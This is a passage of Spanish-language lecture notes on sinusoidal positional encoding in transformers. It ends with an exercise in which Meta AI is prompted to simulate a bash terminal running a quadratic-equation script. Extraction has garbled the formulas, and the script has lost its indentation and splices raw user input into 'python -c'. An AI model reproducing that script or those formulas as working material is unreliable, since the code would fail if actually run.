+Otra opción es normalizar las posiciones dentro de un rango, como [0, 1],
+dividiendo cada posición por la longitud total de la secuencia. Sin embargo,
+esto introduce ambigüedad:
+• Ambigüedad en Posiciones: La misma posición normalizada puede
+corresponder a diferentes posiciones absolutas en secuencias de distinta
+longitud. Por ejemplo, en una secuencia de 5 tokens, la posición 2
+corresponderı́a a 2/5 = 0.4, mientras que en una secuencia de 10 tokens,
+la posición 4 también corresponderı́a a 4/10 = 0.4.
+4.4.3
+
+Codificación Posicional mediante Codificación Binaria
+
+Para evitar estos problemas, se podrı́a pensar en representar las posiciones
+utilizando codificación binaria. Cada posición se representa mediante un
+vector de bits que codifica el número de posición en binario. Por ejemplo:
+10
+
+• Posición 1: (0001)
+• Posición 2: (0010)
+• Posición 3: (0011)
+• Posición 4: (0100)
+• Posición 5: (0101)
+• Posición 6: (0110)
+Esta representación tiene ventajas:
+• Valores Acotados: Los vectores contienen solo 0s y 1s, evitando valores elevados que podrı́an interferir con los embeddings de los tokens.
+• Posiciones Únicas: Cada posición tiene una representación única.
+Sin embargo, la codificación binaria introduce discontinuidades y es de
+naturaleza discreta, mientras que las redes neuronales funcionan mejor con
+representaciones continuas y diferenciables.
+4.4.4
+
+De la Codificación Binaria a las Funciones Sinusoidales
+
+Observando los patrones en la codificación binaria, podemos notar que cada
+bit en la representación binaria alterna entre 0 y 1 a diferentes frecuencias:
+• Bit menos significativo (LSB): Cambia cada posición (0, 1, 0, 1,
+...).
+• Siguiente bit: Cambia cada dos posiciones (0, 0, 1, 1, 0, 0, 1, 1, ...).
+• Bits superiores: Cambian cada cuatro, ocho posiciones, etc.
+Estos patrones de alternancia discreta pueden ser vistos como señales
+que oscilan a diferentes frecuencias. Para adaptar esto al dominio continuo
+y aprovechar la naturaleza diferenciable de las redes neuronales, se utilizan
+funciones sinusoidales.
+
+11
+
+4.4.5
+
+Codificación Posicional Sinusoidal
+
+Los autores de ”Attention is All You Need” [3] propusieron utilizar funciones
+seno y coseno para generar las codificaciones posicionales. La idea es que
+las funciones sinusoidales pueden generar patrones ondulatorios continuos
+a diferentes frecuencias, análogos a los patrones discretos observados en la
+codificación binaria.
+Las fórmulas para calcular los Positional Encodings son:
+PE(pos,2i) = sin (pos × ωk ) ,
+PE(pos,2i+1) = cos (pos × ωk ) ,
+donde ωk es la frecuencia angular definida como:
+1
+
+ωk =
+
+2i
+
+10000 dmodel
+y:
+• pos es la posición del token en la secuencia.
+• i es el ı́ndice de la dimensión del vector.
+• dmodel es la dimensión total del embedding.
+Esta definición asegura que las diferentes dimensiones del vector de codificación posicional correspondan a diferentes frecuencias sinusoidales.
+4.4.6
+
+Intuición Detrás de las Codificaciones Sinusoidales
+
+Las funciones seno y coseno generan señales ondulatorias que oscilan a diferentes frecuencias para cada dimensión del vector de codificación posicional.
+Estas señales continuas permiten al modelo captar tanto la posición absoluta
+como la relativa de los tokens en la secuencia.
+La variación de frecuencias en las dimensiones permite distinguir entre
+diferentes posiciones, ya que cada posición tendrá un patrón único de valores
+en su vector de codificación posicional.
+
+12
+
+4.4.7
+
+Ventajas de las Codificaciones Sinusoidales
+
+• Representación Continua: Las funciones sinusoidales proporcionan
+una representación continua y diferenciable, adecuada para redes neuronales.
+• Captura de Relaciones Relativas: Gracias a las propiedades matemáticas
+de las funciones seno y coseno, el modelo puede aprender fácilmente a
+atender a posiciones relativas.
+• Generalización a Secuencias Más Largas: Las funciones sinusoidales son periódicas y pueden extenderse a posiciones mayores sin
+necesidad de aprender nuevos parámetros.
+• No Añaden Parámetros Entrenables: Las codificaciones sinusoidales
+se calculan mediante una fórmula fija y no requieren parámetros adicionales que deban ser entrenados.
+4.4.8
+
+Implementación en el Modelo
+
+La codificación posicional se suma directamente a los embeddings de los
+tokens:
+
+Embedding de Entrada = Embedding de Token + Codificación Posicional
+Esta suma combina la información de contenido (del token) y de posición
+en una única representación que el modelo utiliza en las siguientes capas.
+
+13
+
+4.4.9
+
+Visualización de las Codificaciones Posicionales
+
+Figure 2: Representación gráfica de las codificaciones posicionales sinusoidales para diferentes posiciones y dimensiones.
+En la Figura 2, cada lı́nea representa una dimensión del vector de codificación
+posicional a lo largo de las posiciones de la secuencia. Las codificaciones
+posicionales sinusoidales permiten a los Transformers incorporar información
+sobre el orden de los tokens en una secuencia, algo fundamental para que el
+modelo pueda interpretar correctamente el significado de las frases.
+Los valores de la codificación posicional varı́an en patrones sinusoidales
+para cada dimensión, alternando entre seno y coseno, según las fórmulas
+propuestas por Vaswani et al. en su trabajo ”Attention Is All You Need” [3]:
+
+PE(pos,2i) = sin
+
+
+
+pos
+2i
+
+
+,
+
+PE(pos,2i+1) = cos
+
+10000 dmodel
+
+
+
+pos
+2i
+
+10000 dmodel
+
+donde:
+• pos es la posición del token en la secuencia,
+• i es el ı́ndice de la dimensión en el embedding,
+14
+
+,
+
+• dmodel es la dimensión del vector de embeddings (en este caso, 16 dimensiones).
+Este método asegura que las codificaciones sean únicas para cada posición
+y permita al modelo aprender relaciones relativas entre las posiciones de los
+tokens. Las primeras dimensiones (Dimensión 0, Dimensión 1, etc.) capturan patrones de alta frecuencia, lo que ayuda a aprender dependencias
+locales entre palabras cercanas, mientras que las últimas dimensiones (Dimensión 14, Dimensión 15 ) oscilan más lentamente, capturando relaciones
+a mayor distancia en la secuencia.
+Las codificaciones posicionales sinusoidales permiten que el modelo generalice mejor a secuencias de diferentes longitudes, ya que el patrón periódico
+de las funciones seno y coseno garantiza que el modelo pueda capturar tanto
+dependencias locales como globales de manera eficiente.
+El uso de estas codificaciones se suma directamente a los embeddings de
+tokens, lo que permite que la información posicional y semántica se integren
+antes de ser procesadas por las capas de atención.
+
+Input Embedding = Token Embedding + Positional Encoding
+Este proceso de sumar codificaciones posicionales y embeddings de tokens facilita que los modelos Transformer manejen secuencias de diferentes
+longitudes y aprendan relaciones posicionales complejas, lo que es esencial
+en tareas como traducción automática, resumen de texto y generación de
+lenguaje natural.
+4.4.10
+
+Importancia en el Transformer
+
+La codificación posicional es fundamental para que el Transformer pueda
+procesar secuencias de manera efectiva, manteniendo la información de orden
+necesaria para entender el lenguaje. Sin este componente, el modelo no
+podrı́a distinguir entre secuencias con los mismos tokens en diferente orden,
+lo que afectarı́a su rendimiento.
+Además, al permitir el procesamiento en paralelo de todos los tokens, los
+Transformers logran una mayor eficiencia computacional y escalabilidad en
+comparación con las RNNs, que procesan secuencias de manera secuencial.
+
+15
+
+4.5
+
+Ventajas de los Transformers sobre las RNNs
+
+La capacidad de procesar secuencias en paralelo es una de las principales
+ventajas de los Transformers sobre las RNNs. Esto permite:
+• Mayor Eficiencia Computacional: Al aprovechar el paralelismo, se
+reducen significativamente los tiempos de entrenamiento, permitiendo
+entrenar modelos con grandes cantidades de datos.
+• Escalabilidad: Es posible entrenar modelos con un gran número de
+parámetros, como GPT-3 o Megatron-Turing, algo inviable con arquitecturas secuenciales.
+• Captura de Dependencias a Largo Plazo: Los mecanismos de
+atención permiten que el modelo considere relaciones entre tokens distantes en la secuencia, superando las limitaciones de las RNNs en este
+aspecto.
+
+4.6
+
+Resumen
+
+En resumen, la codificación posicional es un componente esencial en los
+Transformers para mantener la información de orden en las secuencias de
+entrada. A través de funciones sinusoidales, se logra una representación continua y eficiente de las posiciones de los tokens, permitiendo que el modelo
+procese secuencias en paralelo sin perder el contexto posicional.
+La combinación de la codificación posicional con los mecanismos de atención
+y el procesamiento paralelo ha llevado al desarrollo de modelos de lenguaje
+grandes y poderosos, capaces de realizar tareas complejas en procesamiento
+del lenguaje natural y más allá.
+
+5
+
+Práctica: Uso de Modelos de Lenguaje Grandes
+en Meta AI
+
+Contexto de la Práctica:
+Esta práctica está diseñada para que los ingenieros lleven sus conocimientos teóricos a la praxis a través de ejercicios prácticos. La intención es que
+los participantes comprendan la funcionalidad de los Modelos de Lenguaje
+Grandes (LLMs) como ChatGPT 3.5, Claude y GPT-4. La práctica destaca
+16
+
+las capacidades avanzadas de estos modelos, incluyendo su habilidad para
+manejar complejidades en la generación de respuestas y su uso en entornos
+simulados como terminales de Bash.
+Proceso de la Práctica:
+
+Acceso y Preparación:
+• Los participantes recibirán un enlace por correo electrónico para acceder a los materiales y ejercicios. Es importante escanear y seguir
+este enlace, ya que será el medio para practicar y automatizar algunas
+funciones, aprovechando herramientas como bots.
+• Se introduce el siguiente prompt inicial en Meta AI: "Compórtate como
+una terminal bash con Python instalado y ejecuta únicamente
+los comandos dados:"
+• Posteriormente, se copia y pega el código que se encuentra a continuación en Meta AI.
+
+Código de la Práctica:
+echo "Ingrese coeficiente a: "
+read a
+echo "Ingrese coeficiente b: "
+read b
+echo "Ingrese coeficiente c: "
+read c
+python -c "a=$a; b=$b; c=$c; discriminante=$b**2 - 4*$a*$c;
+if $discriminante < 0:
+print(’No hay soluciones reales’)
+elif $discriminante == 0:
+x=-$b / (2*$a);
+print(f’Solución única: x = {x}’)
+else:
+raiz=($discriminante)**0.5;
+x1=(-$b + raiz) / (2*$a);
+x2=(-$b - raiz) / (2*$a);
+print(f’Soluciones: x1 = {x1} y x2 = {x2}’)"
+17
+
+Resultados de la Ejecución:
+Después de ejecutar el código en Meta AI, los participantes ingresan los
+coeficientes requeridos (por ejemplo, a = 1, b = −3, c = 2), y el modelo
+devuelve correctamente las soluciones:
+• x1 = 2.0
+• x2 = 1.0
+
+Figure 3: Interfaz de Meta AI mostrando el proceso de entrada y los resultados obtenidos.
+Para verificar la precisión de los resultados, se utilizó la plataforma Simbolab, confirmando que las soluciones son correctas.
+
+Figure 4: Verificación de la solución de la ecuación cuadrática en Simbolab.
+Discusión: Capacidades y Limitaciones de los LLMs
+18
+
+Este ejercicio permite explorar cómo los LLMs, como Meta AI, pueden
+manejar tareas de programación básica, como resolver ecuaciones cuadráticas,
+mediante la interpretación de comandos de lenguaje de programación. Esto
+no implica que estos modelos sustituyan o simulen entornos de programación,
+sino que ayuda a los participantes a entender el alcance y las limitaciones de
+los LLMs en el contexto de aplicaciones prácticas.
+La tokenización en los LLMs no solo facilita el procesamiento de lenguaje
+natural en múltiples idiomas, sino también la interpretación de distintos
+lenguajes de programación. Esto permite a los LLMs ejecutar instrucciones
+de manera estructurada, lo que es útil en tareas automatizadas y controladas
+como la práctica actual, donde los participantes pueden ver cómo el modelo
+procesa comandos y devuelve soluciones.
+La IA generativa ha transformado el procesamiento de lenguaje natural
+(NLP) mediante técnicas avanzadas, como los mecanismos de atención y
+la codificación posicional. Estas técnicas permiten a los transformadores
+procesar secuencias de datos de forma eficiente y en paralelo, lo que supera
+las limitaciones de las Redes Neuronales Recurrentes (RNNs), que tienen
+dificultades con dependencias a largo plazo debido al problema de gradiente.
+Los transformadores, en cambio, son capaces de gestionar secuencias extensas
+y escalarse para entrenar modelos complejos como GPT-3 y GPT-4.
+En resumen, esta práctica proporciona una oportunidad para entender
+cómo los LLMs pueden interpretar comandos estructurados y procesar tareas especı́ficas, destacando sus capacidades en la comprensión de lenguajes y
+la ejecución de instrucciones básicas. También permite observar sus limitaciones en precisión y manejo de casos complejos, lo cual es esencial para un
+uso informado y crı́tico de la IA generativa.
+Reflexión sobre el Uso Ético y Seguro de la IA Generativa
+¿Por qué es importante la IA generativa en nuestras vidas? Nos ayuda
+a optimizar procesos, permite realizar tareas que antes requerı́an de varios
+roles, como en el diseño de campañas publicitarias, que ahora pueden ser
+gestionadas por una sola persona con el apoyo de IA. Sin embargo, es fundamental recordar que estos modelos no son perfectos. Por ejemplo, si se les
+pide resolver una ecuación cuadrática con números imaginarios, es probable
+que el resultado no sea correcto debido a ciertas limitaciones en la precisión
+de los cálculos.
+Además, es esencial considerar la privacidad y seguridad de los datos
+cuando se usa IA generativa. Compartir información sensible de una empresa
+con un modelo de IA puede presentar riesgos, y muchos modelos, como los
+19
+
+de OpenAI, advierten contra el uso de datos confidenciales. OpenAI implementa medidas para proteger la información sensible, pero la responsabilidad
+recae también en los usuarios. En entornos empresariales, este aspecto de la
+privacidad es crucial.
+Por último, aunque los LLMs son una herramienta poderosa, no debemos
+depender completamente de ellos para realizar nuestras tareas. Úsenlos como
+apoyo y como un recurso para el aprendizaje, pero asegúrense de comprender los fundamentos y verificar los resultados por ustedes mismos. Como
+ingenieros, es vital practicar y aplicar el conocimiento adquirido en tareas
+concretas, entendiendo tanto el potencial como las limitaciones de los LLMs
+en aplicaciones del mundo real.
+Gracias a todos por su atención, y espero que esta práctica les haya dado
+una visión clara del potencial y las limitaciones de los LLMs, y de cómo la
+IA generativa optimiza procesos en una variedad de aplicaciones en el mundo
+real.
+
+6
+
+Conclusiones
+
+En resumen, los Modelos de Lenguaje Grandes (LLMs) han revolucionado
+el campo de la inteligencia artificial, especialmente en el procesamiento del
+lenguaje natural, permitiendo que las máquinas generen y comprendan texto
+con niveles avanzados de coherencia y contexto. Sin embargo, para aprovechar
+al máximo estas herramientas, es fundamental entender tanto sus capacidades
+como sus limitaciones. La práctica propuesta permite explorar estos aspectos
+de manera controlada y fomenta un uso ético y crı́tico de la IA generativa en
+aplicaciones prácticas.
+• Importancia de los LLMs en la IA Generativa: Los Modelos
+de Lenguaje Grandes (LLMs) representan un avance significativo en la
+inteligencia artificial, especialmente en el procesamiento y generación
+de lenguaje natural. Su capacidad para manejar secuencias largas y
+realizar tareas complejas de forma paralela los convierte en herramientas poderosas para múltiples aplicaciones en la ciencia de datos y la
+industria.
+• Ventajas de los Transformers sobre las RNNs: Gracias a mecanismos como la atención y la codificación posicional, los Transformers
+superan las limitaciones de las Redes Neuronales Recurrentes (RNNs),
+20
+
+particularmente en la gestión de dependencias a largo plazo. Estas caracterı́sticas permiten a los LLMs procesar grandes volúmenes de datos
+de manera eficiente y escalable.
+• Capacidades y limitaciones de los LLMs: Aunque los LLMs son
+efectivos en tareas de generación de texto y ejecución de instrucciones
+básicas de programación, tienen limitaciones en precisión y manejo de
+casos complejos, como la resolución de ecuaciones con números imaginarios. Es esencial reconocer estas limitaciones para un uso adecuado
+y crı́tico de estas herramientas.
+• Aplicación práctica y comprensión de conceptos fundamentales: La práctica propuesta en Meta AI permite a los usuarios explorar las capacidades y limitaciones de los LLMs de forma controlada.
+A través de la simulación de un entorno de programación, los participantes pueden experimentar cómo estos modelos interpretan y ejecutan
+instrucciones estructuradas, proporcionando una comprensión aplicada
+de su funcionamiento.
+• Uso ético y responsable de la IA generativa: La IA generativa,
+aunque poderosa, requiere un uso ético y responsable, especialmente
+en contextos donde se maneja información sensible. Es fundamental
+que los usuarios tomen precauciones para proteger la privacidad de los
+datos y evitar el uso indebido de estos modelos en entornos corporativos
+o personales.
+• Potencial de la IA Generativa en la optimización de procesos:
+La IA generativa ha demostrado su capacidad para optimizar procesos
+que antes requerı́an de múltiples roles, como la creación de contenido
+o la automatización de tareas. Este potencial es relevante en diversas
+industrias, aunque es crucial equilibrar el uso de la IA con el desarrollo
+de habilidades humanas fundamentales.
+• Perspectiva de futuro: Los avances en LLMs y técnicas de IA generativa continúan evolucionando rápidamente. La implementación de tecnologı́as como los Transformers abre nuevas posibilidades en el procesamiento de lenguaje y en la integración de IA en aplicaciones cada vez
+más complejas, lo que plantea interesantes oportunidades y desafı́os
+para el futuro.
+21
+
+References
+[1] Oracle, Oracle Cloud Infrastructure 2024 Generative AI Certified Professional, Oracle, 2024.
+[2] Oracle, Oracle Cloud Infrastructure 2024 Certified AI Foundations Associate, Oracle, 2024.
+[3] A. Vaswani, N. Shazeer, N. Parmar, J. Uszkoreit, L. Jones, A. N. Gomez,
+L. Kaiser, y I. Polosukhin, Attention Is All You Need, arXiv preprint
+arXiv:1706.03762v7, 2017.
+[4] Author(s), Deep Learning and Computational Physics (Lecture Notes),
+arXiv preprint arXiv:2301.00942, 2023.
+[5] A. Kazemnejad, Transformer Architecture: The Positional Encoding, Disponible en: https://kazemnejad.com/blog/transformer_
+architecture_positional_encoding/, 2019.
+
+22
+
